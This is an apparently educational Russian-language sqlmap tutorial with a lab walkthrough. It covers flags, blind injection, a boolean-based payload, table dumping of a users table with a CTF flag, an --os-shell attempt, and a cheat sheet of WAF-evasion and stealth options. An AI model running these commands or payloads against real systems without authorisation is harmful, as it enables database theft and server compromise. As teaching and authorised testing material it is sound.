Переключаемся от самих уязвимостей к инструментам, которые помогают их искать и эксплуатировать на практике. Начнём с классики — `sqlmap`, де-факто стандартного инструмента для автоматизации SQL-инъекций.

# Что такое sqlmap
`sqlmap` — это консольный инструмент с открытым исходным кодом, который автоматизирует обнаружение и эксплуатацию SQL-инъекций в веб-приложениях - https://sqlmap.org/.

Его задача: взять HTTP-запрос (обычно к какому-то параметру в `URL`, теле `POST`, `cookie`, `заголовку`) и проверить, можно ли через него управлять SQL-запросами на сервере, а затем по максимуму использовать эту возможность:
* определить, тип СУБД (MySQL, PostgreSQL, MS SQL, Oracle и др.);
* позволяет перечислять базы, таблицы, колонки;
* умеет вытаскивать данные («дамп»);
* а в некоторых случаях — получить удалённый доступ к системе.

Работает он поверх обычных HTTP-запросов: вы даёте ему `URL` или сырой запрос, он подставляет свои `payload’ы`, анализирует ответы и, если возможно, разворачивает эксплуатацию «на максимум».

Используется он в основном в `пентесте` и `bug bounty`, но принцип работы важно понимать всем, кто занимается безопасностью веба.

## Зачем нужен sqlmap
`Ручная эксплуатация SQL-инъекции` — это много однотипной, рутинной работы. Даже если вы отлично понимаете механику `SQLi`, на практике придётся:
* подбирать рабочий payload;
* проверять разные типы инъекций (`error-based`, `UNION-based`, `blind`, `time-based` и т.д.);
* аккуратно перечислять базы, таблицы, колонки;
* писать однообразные запросы для выборки данных;
* экспериментировать с обходом `WAF`, фильтров, нестандартной логикой приложения.

На одном параметре это ещё терпимо. На десятках эндпоинтов — уже нет.

Задача `sqlmap` — не «думать за вас», а автоматизировать рутину:
* система сама генерирует и отправляет десятки вариантов payload’ов;
* сама определяет, какие из них сработали;
* сама строит запросы для перечисления структур и дампа данных;
* сама подбирает технику для blind-инъекций, если прямого вывода результата нет.

В результате вы фокусируетесь на понимании контекста (где можно, а где нельзя идти дальше, что вообще имеет смысл вытаскивать), а не на переборе синтаксиса.

## Что sqlmap умеет делать с точки зрения возможностей
В общих чертах можно выделить несколько ключевых возможностей.

**Во-первых**, `sqlmap` умеет находить уязвимые параметры.
Вы даёте ему либо целый `URL` (-u "http://site/app.php?id=1"), либо сохранённый HTTP-запрос. Инструмент подставляет свои payload’ы во все потенциальные точки (`GET-параметры`, `POST-поля`, `cookie`, некоторые `заголовки`) и по изменениям в ответах решает, есть ли инъекция и какого она типа.

**Во-вторых**, он умеет определять тип СУБД.
По характерным ошибкам, поведению функций, особенностям синтаксиса `sqlmap` «вычисляет», что за движок стоит за приложением: `MySQL`, `PostgreSQL`, `MS SQL`, `Oracle` и т.п. Это важно, потому что от этого зависят и дальнейшие payload’ы, и способы эскалации.

**Дальше начинается перечисление структур**. Получив рабочую SQL-инъекцию и узнав тип СУБД, `sqlmap` может:
* показать `список баз` (--dbs);
* для выбранной базы — `список таблиц`;
* для таблицы — `список колонок`;
* `вытащить данные` из нужной таблицы/колонок (классический «дамп»).

По сути, инструмент строит и выполняет за вас все эти `SELECT ... FROM information_schema...`, а вы просто выбираете, что именно интересно.

В ряде случаев возможна и более глубокая эксплуатация. Если СУБД и права пользователей позволяют, `sqlmap` может:
* вызывать системные функции и команды (например, через `xp_cmdshell` в `MS SQL` или внешние процедуры в других СУБД);
* загружать свои функции/обёртки;
* превращать SQL-инъекцию фактически в удалённое выполнение команд (`OS command execution`), то есть дать вам shell на сервере.

Это уже не просто «слив базы», а полноценный переход от уязвимости приложения к компрометации хоста.

## Как sqlmap работает внутри
Рассмотрим несколько примеров использования `sqlmap`. Допустим, у нас есть такой URL:
```
http://test.com/product.php?id=10
```
Мы подозреваем, что параметр `id` уязвим к SQL-инъекции. Минимальный запуск `sqlmap`:
```sql
sqlmap -u "http://test.com/product.php?id=10" --batch
```
Здесь:
* `-u` — URL;
* `--batch` — автоматически отвечать на вопросы по умолчанию (полезно для демонстраций и скриптов).

`Sqlmap` сам попытается:
* Внедрится в `id`;
* определить тип `СУБД`;
* проверить разные техники.

Если он найдёт инъекцию, в выводе вы увидите что-то вроде:
```
[INFO] the back-end DBMS is MySQL 
```
и информацию о том, какой параметр уязвим

Часто уязвимость спрятана не в `GET-параметрах`, а в `POST-данных`. Допустим, у нас есть форма логина:
```
POST /login HTTP/1.1
Host: test.com
username=admin&password=123456
```
!!!
акую «сырую» HTTP-запрос в файл, например `request.txt`. Теперь можно дать его `sqlmap`:
```
sqlmap -r request.txt --batch
```
Ключ `-r` говорит: использовать запрос из файла (со всеми заголовками, куками и т.д.). `Sqlmap` сам найдёт параметры (`username`, `password`) и попробует инжектиться в каждый.

Если хотим явно указать, какой параметр тестировать, можно добавить `-p`:
```
sqlmap -r request.txt -p username --batch
```
Так удобнее на реальных приложениях, когда в одном запросе много полей, а вы ясно понимаете, что интересен именно один-два параметра.

**ВИДЕО**

Полезно знать основные флаги в `sqlmap`. Здесь представлены самые популярные:

|Флаг|Что делает|
|---|---|
|`-u`|Указывает целевой URL с параметрами (GET-запрос), например `-u "http://site.com/item.php?id=1"`|
|`-r`|Берёт сырой HTTP-запрос из файла (с заголовками, куками и т.д.), например `-r request.txt`|
|`-p`|Явно указывает, какой параметр тестировать на SQLi, например `-p "id,username"`|
|`--dbs`|После нахождения SQLi перечисляет доступные базы данных на сервере|
|`--tables`|Перечисляет таблицы в указанной базе (`-D`)|
|`--columns`|Показывает список колонок в указанной таблице (`-D + -T`)|
|`--dump`|Дампит (извлекает) данные из выбранной таблицы/колонок|
|`-D`|Выбирает конкретную базу данных, например `-D app_db`|
|`-T`|Выбирает таблицу в выбранной базе, например `-T users`|
|`--batch`|Автоматически отвечает «по умолчанию» на все вопросы `sqlmap` (не задаёт интерактивных вопросов)|
|`--threads=5`|Задает количество потоков для быстрой работы|
|`--level(1-5)`|Сколько разных мест и payload-ов проверять|
|`--risk(1-3)`|Насколько опасные payload-ы разрешить использовать|

`level 1`: Тестирует только параметры `GET` и `POST`.  
`level 2`: Добавляет проверку заголовков `HTTP Cookie`.  
`level 3`: Добавляет проверку заголовков `User-Agent` и `Referer`.  `level 4`: Выполняет более обширные тесты и включает больше полезных нагрузок для каждого параметра.  
`level 5`: Тестирует все возможные точки входа, включая заголовок `Host`.

`risk 1`: Безопасный. Использует безвредные полезные нагрузки для большинства точек SQL-инъекций.  
`risk 2`: Умеренный. Добавляет «тяжелые» тесты SQL-инъекций, основанные на времени, которые могут замедлить или перегрузить сервер.  
`risk 3`: Опасный. Добавляет тесты на внедрение зависимостей на основе оператора ИЛИ (например, ИЛИ 1=1), которые могут непреднамеренно изменять данные в операторах `UPDATE` или `DELETE` или вызывать отказ в обслуживании (`DoS`) на уязвимых системах. Возможно актуально для `time-based` атак.

## Слепые (blind) SQL-инъекции и роль sqlmap
При `blind-инъекции` приложение не показывает напрямую результат запроса. Никаких ошибок, никакого выводимого текста из базы — только то, что было задумано разработчиком. Но при этом вы всё равно можете влиять на SQL-условия и через поведение страницы получать информацию по одному биту/символу.

Классические варианты:
* `boolean-based blind`: вы подставляете выражения вида
`AND 1=1` и `AND 1=2` и смотрите, меняется ли страница. Дальше можно спрашивать «побитовые» вопросы: «первая буква имени базы больше `M`?» и т.п.
* `time-based blind`: вы заставляете СУБД «заснуть» на несколько секунд, если условие истинно, и по задержке проверяете это условие.

`Ручное извлечение данных в blind-режиме` — то ещё удовольствие: для одного поля можно сделать тысячи запросов. `Sqlmap` как раз и делает эту грязную работу автоматом: он строит выражения, измеряет время, анализирует различия и постепенно восстанавливает нужные данные (имена баз, таблиц, содержимое строк).

С точки зрения теории важен именно принцип: инструмент умеет работать даже там, где нет ни ошибок, ни прямого вывода, опираясь только на поведение приложения (контент, длина, время ответа).

## Как именно он отправляет payload’ы
`Sqlmap` не «взламывает в вакууме», он работает строго в рамках тех HTTP-запросов, которые вы ему даёте:
* URL с параметрами,
* тело POST-запроса (в том числе JSON-формат),
* cookie,
* некоторые заголовки.

В каждый из возможных параметров он по очереди подставляет свои фрагменты:
* для проверки синтаксиса и реакции СУБД;
* для разных типов инъекций (`error-based`, `UNION-based`, `boolean-based`, `time-based`);
* для обхода фильтров, если вы включили соответствующие `tamper-скрипты`.
* Полная поддержка шести методов инъекций SQL: `boolean-based blind`, `time-based blind`, `error-based`, `UNION query-based`, `stacked queries` и `out-of-band`.

Дальше для работающих комбинаций уже строится полноценная цепочка: от определения версии и типа СУБД до перечисления и дампа.

## Важно про sqlmap с точки зрения использования
`Sqlmap` — очень мощный инструмент, но это не магическая кнопка «взломать сайт». Без понимания того, что такое SQL-инъекции и как устроены веб-приложения, получится либо «жать флаги наугад», либо ломать что-то случайно. Нормальный сценарий такой: вы сами находите подозрительное место (параметр, эндпоинт), понимаете, что там потенциально `SQLi`, руками проверяете минимальную гипотезу — и уже потом передаёте задачу `sqlmap`, чтобы он развил и автоматизировал `exploitation`.

И второй очевидный, но обязательный момент: использовать такие инструменты можно только в рамках `пентестов`, `bug bounty` и лабораторных стендов, то есть там, где у вас есть разрешение. На боевых чужих системах без договора это уже не «безопасность», а уголовка.

### Если суммировать: 
`sqlmap` — это «оркестр SQL-инъекций», который автоматизирует всё, что в ручном режиме превратилось бы в сотни однообразных запросов. Он отправляет грамотно собранные payload’ы, внимательно анализирует ответы и умеет работать даже в слепых сценариях, где нет ошибок и прямого вывода. Понимание его принципов работы сильно помогает как при атаке (в рамках тестов), так и при защите: гораздо проще проектировать защиту, когда ясно, что именно будет пытаться сделать такой инструмент.

***Запускается не на весь сайт, а на конкретную точку входа, где есть пользовательские данные !!!***
Есть утилиты способные пройтись по всему сайту, и найти все конченые endpoint'ы по словарю распространённых имён - `Dirsearch` (Python):
```
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
python3 dirsearch.py -u http://example.com -e php,html,js
```

## Эксперимент
### 1. Базовый запрос
```
python sqlmap.py -u "http://62.173.140.174:36114/search?q=student" --batch --banner
```
`[INFO] 1. testing connection to the target URL` - 
соединение установлено  
`[INFO] checking if the target is protected by some kind of WAF/IPS` - Проверка наличия защиты Cloudflare WAF, Impreva и т.д. (нет). 

`[INFO] 2. testing if the target URL content is stable` - тестирование соединения ...   
`[INFO] target URL content is stable` - если отправлен дваджды один и тот же запрос, то ответ должен быть одинаков - необходимо для `blind` инъекций.  

`[INFO] 3. testing if GET parameter 'q' is dynamic` - проверка влияет ли параметр q на ответ сервера  
`[INFO] GET parameter 'q' appears to be dynamic` - параметр q влияет на ответ  
`[WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable` - `sqlmpap` пробует простые payloads (`'`, `"`, `))`) и не получает SQL ошибки.

`[INFO] 4. testing for SQL injection on GET parameter 'q'` - тестирование различных техник.  
`[INFO] 4.1 testing 'AND boolean-based blind - WHERE or HAVING clause'` - тестирование boolean-based с помощью `AND 1=1` и `AND 1=2`.  
`[WARNING] reflective value(s) found and filtering out` - найдены отражающие значения (возможно вывод в html моего ввода при запросе). 
`[INFO] testing 'Boolean-based blind - Parameter replace (original value)'` - ...

`[INFO] 4.2 testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'` - проверка error-based для MySQL.

`[INFO] 4.2 testing 'PostgreSQL AND error-based - WHERE or HAVING clause'` - проверка error-based для PostgreSQL.

`[INFO] 4.2 testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'` - проверка error-based для Microsoft SQL Server/Sybase.

`[INFO] 4.2 testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'` - проверка error-based для Oracle.

`[INFO] testing 'Generic inline queries'` - ...

`[INFO] 4.3 testing 'PostgreSQL > 8.1 stacked queries (comment)'` - многоуровневые запросы stacked (`; SELECT ...`).

`[INFO] 4.3 testing 'Microsoft SQL Server/Sybase stacked queries (comment)'` - многоуровневые запросы stacked (`; SELECT ...`).

`[INFO] 4.3 testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'` - многоуровневые запросы stacked (`; SELECT ...`).

`[INFO] 4.4 testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'`  - time-based запросы (`SLEEP(5)`).

`[INFO] 4.4 testing 'PostgreSQL > 8.1 AND time-based blind'` - time-based запросы (`SLEEP(5)`).

`[INFO] 4.4 testing 'Microsoft SQL Server/Sybase time-based blind (IF)'` - time-based запросы (`SLEEP(5)`).

`[INFO] 4.4 testing 'Oracle AND time-based blind'` - time-based запросы (`SLEEP(5)`).

it is recommended to perform only basic `UNION` tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] `Y`

`[INFO] 4.5 testing 'Generic UNION query (NULL) - 1 to 10 columns'` - UNION запросы (`UNION SELECT ...`).

`[INFO] 4.5 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test` - Техника `«ORDER BY»` представляется пригодной. Автоматическое расширение диапазона для UNION тестируется.

`[INFO] 4.6 target URL appears to have 3 columns in query` - sqlmap определил `ORDER BY 3` работает 3 колонки.  
`[WARNING] applying generic concatenation (CONCAT)` - применение конкатенации.
`[INFO] 4.6 GET parameter 'q' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable` - параметр `q` запроса get инжектится. Возможно задан payload - `student' UNION SELECT NULL,NULL,NULL--`

`[INFO] 4.7 checking if the injection point on GET parameter 'q' is a false positive` - дополнительная проверка.
`[WARNING] 4.7 false positive or unexploitable injection point detected` - Обнаружена ложноположительная или неиспользуемая точка инъекции.
`[WARNING] 4.7 GET parameter 'q' does not seem to be injectable` - q больше не инжектится.

`[CRITICAL] 4.8 all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'`

### 2. Расширим количество уровней проверки до 5 максимум
```
python sqlmap.py -u "http://62.173.140.174:36114/search?q=student" --batch --level 5
```
GET parameter `'q'` is vulnerable.  
HTTP(s) requests:
```
Parameter: q (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: q=student' AND 2724=2724-- TYaf
```
`back-end DBMS:` SQLite

### 3. Определим базы данных (на SQLite обычно 1 файл)
```
python sqlmap.py -u "http://62.173.140.174:36114/search?q=student" --batch --dbs
```
`[INFO] the back-end DBMS is SQLite`
back-end DBMS: SQLite  
`[WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')`

#### 4. Определим количество таблиц в БД
```
python sqlmap.py -u "http://62.173.140.174:36114/search?q=student" --batch --tables -D testbd
```
`[WARNING] reflective value(s) found and filtering out` - 2  
`[INFO] retrieved: users`  
`[INFO] retrieved: sqlite_sequence`  
2 tables - sqlite_sequence | users

#### 5. Извлечем данные из каждой таблицы
```
python sqlmap.py -u "http://62.173.140.174:36114/search?q=student" --batch --dump -T users -D testbd
```
`[WARNING] reflective value(s) found and filtering out`
```
CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL, email TEXT NOT NULL, password TEXT NOT NULL, is_admin INTEGER NOT NULL DEFAULT 0, secret TEXT)
```
`[INFO] fetching entries for table 'users'`  
`[INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'`  
...  
Database: <current>  
Table: users  
[3 entries] ...
| 3  | admin@example.com   | FLAG{SQLMAP_LAB_BASIC_INJECTION} |

#### 6. Вызвать удаленное подключение и управление сервером
```
python sqlmap.py -u "http://62.173.140.174:36114/search?q=student" --batch --os-shell
```
`[CRITICAL] on SQLite it is not possible to execute commands`

### Когда неизвестен параметр (q) запроса
1. Найти форму в HTML документе
```html
<form method="get" action="/search">
    <label class="field-label" for="q">Строка поиска</label>
    <input id="q" name="q" type="text" value="admin' AND 2724=2724-- TYaf" placeholder="например, ali, admin, student">
    <button type="submit">Искать</button>
</form>
```
В данном случае `name=q` параметр `q`.

2. Смотреть http запрос в инструментах разработчика или Burp Suite:
```
POST /search
q=sydent
```
3. SQLMAP crawler (href...)
```
sqlmap -u hhtp://site.com --crawl=2
```
sqlmap сам найдет ссылки и параметры.
4. Параметры могут быть спрятаны в Wayback, JS, hidden endpoints:
```js
fetch("/api/search?q=test")
```

### Если GET убрали и данные идут через POST
Тогда sqlmap работает с POST:
```html
<form method="POST" action="/search">
    <input id="q" name="q">
</form>
```
Запрос будет:
```
POST /search
q=student
```
sqlmap:
```
sqlmap -u "http://site.com/search" --data="q=student"
```

### Как передать форму в sqlmap
#### Форма:
```html
<form method="POST">
    <input type="text" id="username" name="username" required="">
    <input type="password" id="password" name="password" required="">
</form>
```
Тогда в sqlmap:
```
sqlmap -u "http://site.com/login" \
--data="username=admin&password=test"
```
или
```
sqlmap -u "http://site.com/login" --data="username=admin&password=test"
```
#### Через текстовый файл:
```
sqlmap -r req.txt
```
#### Если JSON POST:
```http
POST /api/login
Content-Type: application/json
{
  "username":"admin",
  "password":"test"
}
```
Тогда в sqlmap:
```
sqlmap -u http://site.com/api/login \
--data='{"username":"admin","password":"test"}' \
--headers="Content-Type: application/json"
```
#### Если параметр неизвестен
sqlmap:
```
--data="username=admin&password=*"
```

## ТОП-команд
### 1. Базовый GET параметр
```
sqlmap -u "https://site.com/item?id=1" --batch
```
### 2. POST форма
```
sqlmap -u "https://site.com/login" --data="username=test&password=test"
```
### 3. Через raw request (мой любимый способ)
Это часто лучше всего. Сохраняешь запрос из Burp Suite:
```
sqlmap -r request.txt
```
### 4. Авторизация cookie
В 99% случаев интересные уязвимости находятся за формой входа. Чтобы `sqlmap` работал в авторизованной зоне, ему нужно передать вашу сессионную `cookie`.
```
sqlmap -u "https://site.com/profile?id=1" --cookie="session=abc123"
```
### 5. JSON API
```
sqlmap -u "https://site.com/api/login" --data='{"user":"admin","pass":"test"}' --headers="Content-Type: application/json"
```
### 6. Указать конкретный параметр
```
sqlmap -u "https://site.com/search?q=test&page=1" -p q
```
### 7. Повышенный риск
```
sqlmap -u "URL" --risk=3 --level=5
```
### 8. Все формы
Найдет все формы на странице и попробует вставить в них данные
```
sqlmap -u "https://site.com" --forms
...
[1/1] Form:
POST http://62.173.140.174:36100/login
POST data: username=&password=
do you want to test this form? [Y/n/q]
```
### 9. Crawling
Ищет новые URL внутри сайта для тестирования. Ищет `href=...`
```
sqlmap -u "https://site.com" --crawl=3
```
### 10. База данных
```
sqlmap -u "URL" --dbs
```
### 11. Таблицы
```
sqlmap -u "URL" -D dbname --tables
```
### 12. Колонки
```
sqlmap -u "URL" -D dbname -T users --columns
```
### 13. Dump
```
sqlmap -u "URL" -D dbname -T users --dump
```
### 14. Только boolean
```
sqlmap -u "URL" --technique=B
```
### 15. Только time-based
```
sqlmap -u "URL" --technique=T
```
### 16. Только UNION
```
sqlmap -u "URL" --technique=U
```
### 17. Только error-based
```
sqlmap -u "URL" --technique=E
```
### 18. WAF обход
```
sqlmap -u "URL" --tamper=space2comment
```
```
sqlmap -u "http://site/?id=1" --tamper=space2comment,randomcase,base64encode --level=5 --risk=3 --random-agent
```
### 19. Random User-Agent
Всегда используйте `--random-agent`, чтобы не палиться по стандартному `User-Agent` от `sqlmap`.
```
sqlmap -u "URL" --random-agent
```
### 20. Batch режим
```
sqlmap -u "URL" --batch
```
### Для REST API
```
sqlmap -r api_request.txt
```
Если приложение общается через JSON, укажите место для инъекции звездочкой `*`:
```bash
sqlmap -u "http://api.site.com/v1/user" --method=POST --data='{"id": 1, "role": "user"}' --headers="Content-Type: application/json" -p "id"
```
Или просто укажите, какой параметр проверять, с помощью флага `-p`.

https://codeby.net/threads/sqlmap-polnoye-rukovodstvo-2025-po-sql-in-yektsiyam-ot-osnov-do-obkhoda-waf.65032/